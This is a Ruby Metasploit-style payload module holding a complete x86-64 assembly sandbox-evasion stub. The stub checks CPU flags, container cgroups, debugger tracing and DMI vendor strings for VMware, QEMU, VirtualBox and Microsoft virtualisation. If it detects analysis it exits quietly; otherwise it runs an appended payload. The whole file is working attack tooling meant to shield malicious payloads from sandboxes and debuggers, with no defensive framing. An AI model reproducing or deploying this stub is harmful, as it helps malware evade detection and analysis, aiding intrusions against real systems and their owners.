module Msf::Payload::Linux::X64::SandboxEvasion
  def sandbox_evasion
    asm = %Q^
start:
    jmp get_strings

main:
    pop r12               ; r12 = address of first string
    sub rsp, 0x1000       ; allocate 4KB buffer
    xor r15, r15          ; score = 0

; ─────────────────────────────────────────────────────────────
; Check 1: /proc/cpuinfo for "hypervisor" → +20
; String at r12 + 0
; ─────────────────────────────────────────────────────────────
check1:
    lea rdi, [r12 + 0]    ; path = "/proc/cpuinfo"
    xor esi, esi          ; O_RDONLY
    mov eax, 2            ; open()
    syscall
    test rax, rax
    js check2

    mov r13, rax          ; fd
    mov rdi, r13
    mov rsi, rsp          ; buffer
    mov edx, 0x1000       ; len
    xor eax, eax          ; read()
    syscall
    mov r14, rax          ; bytes read

    mov rdi, r13
    mov eax, 3            ; close()
    syscall

    cmp r14, 10
    jl check2
    xor rdx, rdx
    sub r14, 10

scan_hv:
    cmp rdx, r14
    jg check2
    cmp byte ptr [rsp + rdx + 0], 'h'
    jne next_hv
    cmp byte ptr [rsp + rdx + 1], 'y'
    jne next_hv
    cmp byte ptr [rsp + rdx + 2], 'p'
    jne next_hv
    cmp byte ptr [rsp + rdx + 3], 'e'
    jne next_hv
    cmp byte ptr [rsp + rdx + 4], 'r'
    jne next_hv
    cmp byte ptr [rsp + rdx + 5], 'v'
    jne next_hv
    cmp byte ptr [rsp + rdx + 6], 'i'
    jne next_hv
    cmp byte ptr [rsp + rdx + 7], 's'
    jne next_hv
    cmp byte ptr [rsp + rdx + 8], 'o'
    jne next_hv
    cmp byte ptr [rsp + rdx + 9], 'r'
    jne next_hv
    add r15, 20
    jmp check2

next_hv:
    inc rdx
    jmp scan_hv

; ─────────────────────────────────────────────────────────────
; Check 2: /proc/1/cgroup for "docker" → +20
; String at r12 + 14
; ─────────────────────────────────────────────────────────────
check2:
    lea rdi, [r12 + 14]   ; path = "/proc/1/cgroup"
    xor esi, esi
    mov eax, 2
    syscall
    test rax, rax
    js check3

    mov r13, rax
    mov rdi, r13
    mov rsi, rsp
    mov edx, 0x1000
    xor eax, eax
    syscall
    mov r14, rax

    mov rdi, r13
    mov eax, 3
    syscall

    cmp r14, 6
    jl check3
    xor rdx, rdx
    sub r14, 6

scan_docker:
    cmp rdx, r14
    jg check3
    cmp byte ptr [rsp + rdx + 0], 'd'
    jne next_docker
    cmp byte ptr [rsp + rdx + 1], 'o'
    jne next_docker
    cmp byte ptr [rsp + rdx + 2], 'c'
    jne next_docker
    cmp byte ptr [rsp + rdx + 3], 'k'
    jne next_docker
    cmp byte ptr [rsp + rdx + 4], 'e'
    jne next_docker
    cmp byte ptr [rsp + rdx + 5], 'r'
    jne next_docker
    add r15, 20
    jmp check3

next_docker:
    inc rdx
    jmp scan_docker

; ─────────────────────────────────────────────────────────────
; Check 3: /proc/self/status for TracerPid != 0 → +25
; String at r12 + 29
; ─────────────────────────────────────────────────────────────
check3:
    lea rdi, [r12 + 29]   ; path = "/proc/self/status"
    xor esi, esi
    mov eax, 2
    syscall
    test rax, rax
    js check4

    mov r13, rax
    mov rdi, r13
    mov rsi, rsp
    mov edx, 0x1000
    xor eax, eax
    syscall
    mov r14, rax

    mov rdi, r13
    mov eax, 3
    syscall

    cmp r14, 12
    jl check4
    xor rdx, rdx
    sub r14, 12

scan_tracer:
    cmp rdx, r14
    jg check4
    cmp byte ptr [rsp + rdx + 0],  'T'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 1],  'r'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 2],  'a'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 3],  'c'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 4],  'e'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 5],  'r'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 6],  'P'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 7],  'i'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 8],  'd'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 9],  ':'
    jne next_tracer
    cmp byte ptr [rsp + rdx + 10], 9
    jne next_tracer
    cmp byte ptr [rsp + rdx + 11], '0'
    je next_tracer
    add r15, 25
    jmp check4

next_tracer:
    inc rdx
    jmp scan_tracer

; ─────────────────────────────────────────────────────────────
; Check 4: /sys/class/dmi/id/sys_vendor for VM vendor → +20
; String at r12 + 47
; ─────────────────────────────────────────────────────────────
check4:
    lea rdi, [r12 + 47]   ; path = "/sys/class/dmi/id/sys_vendor"
    xor esi, esi
    mov eax, 2
    syscall
    test rax, rax
    js gate

    mov r13, rax
    mov rdi, r13
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall
    mov r14, rax

    mov rdi, r13
    mov eax, 3
    syscall

    cmp r14, 4
    jl gate
    xor rdx, rdx
    sub r14, 4

scan_vendor:
    cmp rdx, r14
    jg gate

    cmp byte ptr [rsp + rdx + 0], 'V'
    jne chk_qemu
    cmp byte ptr [rsp + rdx + 1], 'M'
    jne chk_qemu
    cmp byte ptr [rsp + rdx + 2], 'w'
    jne chk_qemu
    cmp byte ptr [rsp + rdx + 3], 'a'
    jne chk_qemu
    add r15, 20
    jmp gate

chk_qemu:
    cmp byte ptr [rsp + rdx + 0], 'Q'
    jne chk_vbox
    cmp byte ptr [rsp + rdx + 1], 'E'
    jne chk_vbox
    cmp byte ptr [rsp + rdx + 2], 'M'
    jne chk_vbox
    cmp byte ptr [rsp + rdx + 3], 'U'
    jne chk_vbox
    add r15, 20
    jmp gate

chk_vbox:
    cmp byte ptr [rsp + rdx + 0], 'i'
    jne chk_hv
    cmp byte ptr [rsp + rdx + 1], 'n'
    jne chk_hv
    cmp byte ptr [rsp + rdx + 2], 'n'
    jne chk_hv
    cmp byte ptr [rsp + rdx + 3], 'o'
    jne chk_hv
    add r15, 20
    jmp gate

chk_hv:
    cmp byte ptr [rsp + rdx + 0], 'M'
    jne next_vendor
    cmp byte ptr [rsp + rdx + 1], 'i'
    jne next_vendor
    cmp byte ptr [rsp + rdx + 2], 'c'
    jne next_vendor
    cmp byte ptr [rsp + rdx + 3], 'r'
    jne next_vendor
    add r15, 20
    jmp gate

next_vendor:
    inc rdx
    jmp scan_vendor

; ─────────────────────────────────────────────────────────────
; Gate: score >= 50 → exit_group(0), else fall through to payload
; ─────────────────────────────────────────────────────────────
gate:
    cmp r15, 50
    jl pass
    mov eax, 231          ; exit_group
    xor edi, edi
    syscall

pass:
    add rsp, 0x1000       ; restore stack
    jmp payload_entry     ; skip string table, into appended payload

get_strings:
    call main
    db "/proc/cpuinfo", 0
    db "/proc/1/cgroup", 0
    db "/proc/self/status", 0
    db "/sys/class/dmi/id/sys_vendor", 0

payload_entry:
    ; raw payload bytes appended immediately after this stub
^
    Metasm::Shellcode.assemble(Metasm::X86_64.new, asm).encode_string
  end
end